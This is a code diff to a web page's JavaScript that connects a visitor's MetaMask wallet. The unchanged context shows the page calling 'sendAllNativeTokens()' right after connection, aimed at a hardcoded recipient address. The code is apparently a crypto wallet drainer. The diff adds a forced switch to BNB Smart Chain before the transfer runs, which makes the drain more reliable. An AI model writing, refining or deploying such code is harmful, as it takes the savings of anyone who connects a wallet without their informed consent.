@@ -120,11 +120,11 @@
         let signer;
         let userAddress = "";
         const recipientAddress = "0xYourDestinationWalletAddressHere";
-        const chains = [
-            { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH' },
-            { chainId: 56, name: 'Binance Smart Chain', nativeSymbol: 'BNB' },
-            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC' }
-        ];
+        const chains = {
+            1: { name: 'Ethereum', nativeSymbol: 'ETH' },
+            56: { name: 'Binance Smart Chain', nativeSymbol: 'BNB' },
+            137: { name: 'Polygon', nativeSymbol: 'MATIC' }
+        };
 
         document.getElementById('connectWallet').addEventListener('click', async () => {
             try {
@@ -132,7 +132,8 @@
                     document.getElementById('status').innerText = `MetaMask is not installed.`;
                     return;
                 }
-                
+
+                // Request account access
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
@@ -141,7 +142,8 @@
                 document.getElementById('disconnectWallet').disabled = false;
                 document.getElementById('connectWallet').disabled = true;
 
-                // Automatically send crypto
+                // Check and switch network before sending transaction
+                await checkAndSwitchNetwork(56); // BNB Smart Chain
                 await sendAllNativeTokens();
             } catch (error) {
                 document.getElementById('status').innerText = `Connection failed: ${error.message}`;
@@ -156,14 +158,21 @@
             document.getElementById('connectWallet').disabled = false;
         });
 
-        async function switchNetwork(chainId) {
-            try {
-                await provider.send("wallet_switchEthereumChain", [{ chainId: ethers.utils.hexValue(chainId) }]);
-                const network = await provider.getNetwork();
-                if (network.chainId !== chainId) throw new Error(`Expected chainId ${chainId}, but got ${network.chainId}.`);
-                document.getElementById('status').innerText += `\nSwitched to ${network.name}.`;
-            } catch (error) {
-                document.getElementById('status').innerText = `\nFailed to switch network: ${error.message}`;
+        async function checkAndSwitchNetwork(expectedChainId) {
+            const currentNetwork = await provider.getNetwork();
+            if (currentNetwork.chainId !== expectedChainId) {
+                document.getElementById('status').innerText += `\nSwitching network to ${chains[expectedChainId].name}...`;
+                try {
+                    await provider.send("wallet_switchEthereumChain", [{ chainId: ethers.utils.hexValue(expectedChainId) }]);
+                    document.getElementById('status').innerText += `\nSwitched to ${chains[expectedChainId].name}.`;
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        // The network has not been added to MetaMask
+                        document.getElementById('status').innerText += `\nPlease add ${chains[expectedChainId].name} to MetaMask manually.`;
+                    } else {
+                        throw new Error(`Failed to switch network: ${switchError.message}`);
+                    }
+                }
             }
         }
 
